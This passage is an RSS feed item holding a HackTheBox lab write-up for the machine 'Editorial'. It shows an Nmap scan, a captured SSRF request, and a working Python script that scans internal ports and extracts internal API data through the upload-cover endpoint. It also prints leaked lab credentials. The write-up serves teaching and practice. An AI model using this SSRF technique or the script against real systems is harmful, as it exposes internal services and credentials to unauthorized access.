@@ -1,0 +1,561 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Internal-Service on Shakil's Blog</title><link>https://hshakilst.github.io/tags/internal-service/</link><description>Recent content in Internal-Service on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Sun, 16 Jun 2024 05:12:20 -0400</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/internal-service/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Machine Editorial</title><link>https://hshakilst.github.io/posts/htb-machines/editorial/</link><pubDate>Sun, 16 Jun 2024 05:12:20 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-machines/editorial/</guid><description><![CDATA[<h1 id="editorial---htbhttpsapphacktheboxcommachineseditorial">Editorial - <a href="https://app.hackthebox.com/machines/Editorial">HTB</a></h1>
+<p><img src="images/banner.png" alt="alt text"></p>
+<h3 id="recon">Recon</h3>
+<p>Let&rsquo;s start off by Nmap&rsquo;ing the target.</p>
+<h4 id="nmap">Nmap</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span># Nmap 7.94SVN scan initiated Tue Jun 18 07:58:25 2024 as: nmap -vvv -p 22,80 -sCV -oN nmap 10.129.49.40
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report for editorial.htb (10.129.49.40)
+</span></span><span style="display:flex;"><span>Host is up, received conn-refused (0.37s latency).
+</span></span><span style="display:flex;"><span>Scanned at 2024-06-18 07:58:25 +02 for 27s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE REASON VERSION
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
+</span></span><span style="display:flex;"><span>| 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Editorial Tiempo Arriba
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_ Supported Methods: OPTIONS HEAD GET
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># Nmap done at Tue Jun 18 07:58:52 2024 -- 1 IP address (1 host up) scanned in 27.03 seconds
+</span></span></code></pre></div><h4 id="http-service">HTTP Service</h4>
+<p><img src="images/20240618081128.png" alt="alt text">
+The <code>http://editorial.htb/upload</code> looks interesting. There&rsquo;s a field name called <code>bookurl</code> which accepts an URL and tries to load the image when the <code>Preview</code> button is clicked. It sends the following request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>POST /upload-cover HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: editorial.htb
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=---------------------------30720708513481866454123983682
+</span></span><span style="display:flex;"><span>Content-Length: 372
+</span></span><span style="display:flex;"><span>Origin: http://editorial.htb
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Referer: http://editorial.hrb/upload
+</span></span><span style="display:flex;"><span>DNT: 1
+</span></span><span style="display:flex;"><span>Sec-GPC: 1 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;bookurl&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://10.10.14.133:8000/aaa.jpeg
+</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;bookfile&#34;; filename=&#34;&#34;
+</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------30720708513481866454123983682--
+</span></span></code></pre></div><p>The above request sends a GET request to <code>http://10.10.14.133:8000/aaa.jpeg</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">8000</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:8000/<span style="color:#ff79c6">)</span> ...
+</span></span><span style="display:flex;"><span>10.129.49.40 - - <span style="color:#ff79c6">[</span>18/Jun/2024 08:07:01<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /aaa.jpeg HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
+</span></span></code></pre></div><p>Looks like it&rsquo;s vulnerable to SSRF and we can read the data by visiting a temporary upload URL.
+<img src="images/20240618081046.png" alt="alt text"></p>
+<p>After this point, I tried to upload a shell but I couldn&rsquo;t execute code on the server. Also the temporary file was deleted between 1-2 minutes. So, I researched on SSRF and found an <a href="https://cyberweapons.medium.com/internal-port-scanning-via-ssrf-eb248ae6fa7b">article discussing internal port scanning using SSRF called <strong>Cross-Site Port Attack</strong>(XSPA)</a>.</p>
+<p>Then, I tried Burp&rsquo;s intruder but the scan time was very slow in the community edition. Therefore, I wrote a custom python script to scan for ports and using the temporary file upload link we can grab the information about any possible hits.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">discoverPorts</span>(port):
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># URL to which the request will be sent</span>
+</span></span><span style="display:flex;"><span>    url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/upload-cover&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Files to be uploaded</span>
+</span></span><span style="display:flex;"><span>    files <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookfile&#39;</span>: (<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;application/octet-stream&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Form data</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookurl&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:&#39;</span> <span style="color:#ff79c6">+</span> port
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Headers for the request</span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Host&#39;</span>: <span style="color:#f1fa8c">&#39;editorial.htb&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept&#39;</span>: <span style="color:#f1fa8c">&#39;*/*&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Language&#39;</span>: <span style="color:#f1fa8c">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Encoding&#39;</span>: <span style="color:#f1fa8c">&#39;gzip, deflate, br&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Origin&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Connection&#39;</span>: <span style="color:#f1fa8c">&#39;close&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb/upload&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;DNT&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Sec-GPC&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Send the POST request with the files, form data, and headers</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>data, headers<span style="color:#ff79c6">=</span>headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Print the response from the server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Found Something Interesting on Port: &#34;</span> <span style="color:#ff79c6">+</span> port)
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;static/uploads/&#34;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Getting the Interesting File&#34;</span>)
+</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/&#39;</span> <span style="color:#ff79c6">+</span> response<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(url)
+</span></span><span style="display:flex;"><span>            res_secret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> res_secret<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;intresting-file.txt&#39;</span>,<span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> file:
+</span></span><span style="display:flex;"><span>                    file<span style="color:#ff79c6">.</span>write(res_secret<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>encode())
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Nothing found on Port: &#34;</span> <span style="color:#ff79c6">+</span> port)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">getEndpointData</span>(endpoint):
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># URL to which the request will be sent</span>
+</span></span><span style="display:flex;"><span>    url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/upload-cover&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Files to be uploaded</span>
+</span></span><span style="display:flex;"><span>    files <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookfile&#39;</span>: (<span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&#39;</span>, <span style="color:#f1fa8c">&#39;application/octet-stream&#39;</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Form data</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;bookurl&#39;</span>: <span style="color:#f1fa8c">&#39;http://127.0.0.1:5000&#39;</span> <span style="color:#ff79c6">+</span> endpoint
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Headers for the request</span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Host&#39;</span>: <span style="color:#f1fa8c">&#39;editorial.htb&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept&#39;</span>: <span style="color:#f1fa8c">&#39;*/*&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Language&#39;</span>: <span style="color:#f1fa8c">&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Accept-Encoding&#39;</span>: <span style="color:#f1fa8c">&#39;gzip, deflate, br&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Origin&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Connection&#39;</span>: <span style="color:#f1fa8c">&#39;close&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Referer&#39;</span>: <span style="color:#f1fa8c">&#39;http://editorial.htb/upload&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;DNT&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#39;Sec-GPC&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Send the POST request with the files, form data, and headers</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>data, headers<span style="color:#ff79c6">=</span>headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># Print the response from the server</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Found Something Interesting on endpoint: &#34;</span> <span style="color:#ff79c6">+</span> endpoint)
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(response<span style="color:#ff79c6">.</span>text)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> response<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>startswith(<span style="color:#f1fa8c">&#34;static/uploads/&#34;</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Getting the Interesting File&#34;</span>)
+</span></span><span style="display:flex;"><span>            url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://editorial.htb/&#39;</span> <span style="color:#ff79c6">+</span> response<span style="color:#ff79c6">.</span>text
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(url)
+</span></span><span style="display:flex;"><span>            res_secret <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(url)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> res_secret<span style="color:#ff79c6">.</span>status_code <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">200</span>:
+</span></span><span style="display:flex;"><span>                filename <span style="color:#ff79c6">=</span> endpoint<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>                filename <span style="color:#ff79c6">=</span> filename[<span style="color:#8be9fd;font-style:italic">len</span>(filename)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(filename,<span style="color:#f1fa8c">&#39;wb&#39;</span>) <span style="color:#ff79c6">as</span> file:
+</span></span><span style="display:flex;"><span>                    file<span style="color:#ff79c6">.</span>write(res_secret<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>encode())
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Nothing found on URL: &#34;</span> <span style="color:#ff79c6">+</span> url)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3000</span>, <span style="color:#bd93f9">10000</span>):
+</span></span><span style="display:flex;"><span>        stop_flag <span style="color:#ff79c6">=</span> discoverPorts(<span style="color:#8be9fd;font-style:italic">str</span>(i))
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> stop_flag:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>    endpoints <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/promos&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/authors&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata/changelog&#34;</span>,
+</span></span><span style="display:flex;"><span>                 <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> endpoint <span style="color:#ff79c6">in</span> endpoints:
+</span></span><span style="display:flex;"><span>        getEndpointData(endpoint)
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></div><p>The script is a proof of concept and not refactored well but it gets the job done.</p>
+<p>I found a hit on port <code>5000</code> and the output looks like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;messages&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;promotions&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/promos&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;coupons&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;new_authors&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/authors&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;platform_use&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve examples of how to use the platform.&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ],
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;version&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;changelog&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata/changelog&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;latest&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;description&#34;</span>: <span style="color:#f1fa8c">&#34;Retrieve the last version of api.&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;endpoint&#34;</span>: <span style="color:#f1fa8c">&#34;/api/latest/metadata&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">&#34;methods&#34;</span>: <span style="color:#f1fa8c">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It seems there&rsquo;s an internal API service running on port 5000. So I tried to get all the endpoints listed here. Out of these 6 endpoints 3 of them returned 200 and JSON data.</p>
+<p><strong>authors</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;template_mail_message&#34;</span>: <span style="color:#f1fa8c">&#34;Welcome to the team! We are thrilled to have you on board and can&#39;t wait to see the incredible content you&#39;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#39;t hesitate to reach out if you have any questions or ideas - we&#39;re always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team.&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>changelog</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;1&#34;</span>: {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;api_route&#34;</span>: <span style="color:#f1fa8c">&#34;/api/v1/metadata/&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_1&#34;</span>: <span style="color:#f1fa8c">&#34;soporte@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;contact_email_2&#34;</span>: <span style="color:#f1fa8c">&#34;info@tiempoarriba.oc&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;editorial&#34;</span>: <span style="color:#f1fa8c">&#34;Editorial El Tiempo Por Arriba&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
